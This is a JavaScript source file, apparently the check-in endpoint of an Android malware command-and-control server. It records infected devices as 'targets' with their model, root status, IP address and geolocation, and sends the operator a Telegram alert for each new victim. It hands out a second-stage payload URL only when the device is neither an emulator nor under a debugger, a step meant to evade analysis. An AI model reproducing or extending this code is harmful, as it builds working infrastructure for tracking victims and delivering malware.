/**
 * FILE: app/api/checkin/route.js
 * Next.js Route Handler untuk Checkin Target.
 */

import { NextResponse } from 'next/server';
import { saveTarget, updateTarget, getTarget } from '../../../lib/database.js';
import { checkEmulator, getGeolocation, isSuspiciousIP } from '../../../lib/fingerprint.js';
import { generateToken, hash } from '../../../lib/crypto.js';
import { sendMessage } from '../../../lib/telegramBot.js';
import config from '../../../lib/config.js';

export async function POST(req) {
  try {
    const body = await req.json();
    const { deviceId, model, manufacturer, androidVersion, buildFingerprint, isRooted, isDebugger } = body;
    
    // Ambil IP dari header Vercel
    const ip = req.headers.get('x-forwarded-for') || '127.0.0.1';
    const deviceHash = hash(deviceId);
    
    const deviceInfo = { model, manufacturer, androidVersion, buildFingerprint, isRooted, isDebugger };
    const isEmulator = checkEmulator(deviceInfo);
    const geo = await getGeolocation(ip);
    
    let shouldDownload = false;
    if (!isEmulator && !isDebugger) {
      shouldDownload = true;
    }
    
    const targetData = {
      deviceInfo,
      ip,
      location: geo,
      isEmulator,
      status: 'active'
    };
    
    let target = await getTarget(deviceHash);
    if (!target) {
      target = await saveTarget(deviceHash, targetData);
      
      const msg = `📱 *NEW TARGET!*
Model: ${model}
Loc: ${geo.city}, ${geo.country}
ID: \`${deviceHash}\``;
      await sendMessage(config.telegram.adminChatId, msg);
    } else {
      await updateTarget(deviceHash, targetData);
    }
    
    const token = generateToken(deviceHash, Date.now());
    
    return NextResponse.json({
      success: true,
      should_download: shouldDownload,
      token: token,
      payload_url: shouldDownload ? `/api/payload?token=${token}` : null
    }, { status: 200 });
    
  } catch (err) {
    console.error('Checkin Error:', err);
    return NextResponse.json({ success: false, error: err.message }, { status: 500 });
  }
}
